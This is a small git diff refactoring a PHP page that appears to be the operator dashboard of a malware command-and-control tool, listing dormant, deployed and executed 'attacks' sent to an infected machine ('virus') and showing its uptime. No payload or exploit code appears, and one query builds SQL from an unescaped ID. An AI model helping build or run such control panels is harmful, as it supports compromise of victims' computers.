@@ -1,4 +1,4 @@
-<?php /** @noinspection DuplicatedCode */
+<?php
 
 /** @noinspection PhpUnusedParameterInspection */
 
@@ -7,8 +7,6 @@ use Kelvinho\Virus\Attack\PackageRegistrar;
 use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\Singleton\HtmlTemplate;
 use Kelvinho\Virus\Singleton\Timezone;
-use Kelvinho\Virus\Virus\Virus;
-use function Kelvinho\Virus\db;
 use function Kelvinho\Virus\filter;
 use function Kelvinho\Virus\formattedHash;
 use function Kelvinho\Virus\formattedTime;
@@ -158,7 +156,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <h2>Dormant attacks</h2>
 <p>These are attacks that are not yet executed, and are not sent to the virus to execute. It just kinda hangs around
     here until you want to attack.</p>
-<?php echo displayTable(Virus::getAttacks($virus_id, AttackBase::STATUS_DORMANT), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
+<?php echo displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
     $attack = $attackFactory->get($attack_id);
     $onclick = "onclick = \"redirect('$attack_id')\"";
     return ["<a $onclick>" . $attack->getName() . "</a>",
@@ -172,7 +170,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
     is downloading the attacks, the internet is dropped and the payload doesn't get downloaded. If a payload stays
     here for more than an hour then this is likely the case. Then you can delete the attacks and start a new one all
     over again.</p>
-<?php echo displayTable(Virus::getAttacks($virus_id, AttackBase::STATUS_DEPLOYED), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
+<?php echo displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
     $attack = $attackFactory->get($attack_id);
     $onclick = "onclick = \"redirect('$attack_id')\"";
     return ["<a $onclick>" . $attack->getName() . "</a>",
@@ -182,7 +180,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 }); ?>
 <h2>Executed attacks</h2>
 <p>These are attacks that are executed, and the virus has sent back results.</p>
-<?php echo displayTable(Virus::getAttacks($virus_id, AttackBase::STATUS_EXECUTED), ["Name", "Package", "Hash/id", "Executed time", ""], function ($attack_id, $timezone) use ($attackFactory) {
+<?php echo displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED), ["Name", "Package", "Hash/id", "Executed time", ""], function ($attack_id, $timezone) use ($attackFactory) {
     $attack = $attackFactory->get($attack_id);
     $onclick = "onclick = \"redirect('$attack_id')\"";
     return ["<a $onclick>" . $attack->getName() . "</a>",
@@ -351,11 +349,10 @@ $user = $userFactory->get($session->get("user_handle")); ?>
     }
 
     function getUptimes(string $virus_id): array {
+        global $mysqli;
         // fetching uptimes
         $uptimes = [];
-        $mysqli = db();
         $answer = $mysqli->query("select unix_time, cast(active as unsigned integer) as activeI from uptimes where virus_id = \"$virus_id\" order by unix_time");
-        $mysqli->close();
         if ($answer) {
             while ($row = $answer->fetch_assoc()) {
                 $uptimes[] = ["unix_time" => (int)$row["unix_time"], "active" => (int)$row["activeI"]];
